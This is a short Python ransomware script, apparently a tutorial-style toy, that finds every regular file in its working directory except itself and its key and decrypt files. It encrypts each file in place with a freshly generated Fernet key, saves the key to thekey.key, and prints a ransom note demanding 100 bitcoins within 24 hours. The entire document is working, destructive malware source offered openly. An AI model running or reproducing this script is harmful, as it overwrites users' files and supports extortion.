#!/usr/bin/env python3
import os
from cryptography.fernet import Fernet

files = []
for file in os.listdir():
	if file == "ransomware.py" or file == "thekey.key" or file == "decrypt.py":
		continue
	if os.path.isfile(file):
		files.append(file)
print(files)

key = Fernet.generate_key()

with open("thekey.key","wb") as thekey:
	thekey.write(key)

for file in files:
	with open(file,"rb") as thefile:
		contents = thefile.read()
	contents_encrypted = Fernet(key).encrypt(contents)
	flag = 1
	with open(file,"wb") as thefile:
		thefile.write(contents_encrypted)

if(flag == 1):
	print("your files have been encrypted, send 100 bitcoins in next 24 hours to decrypt them")
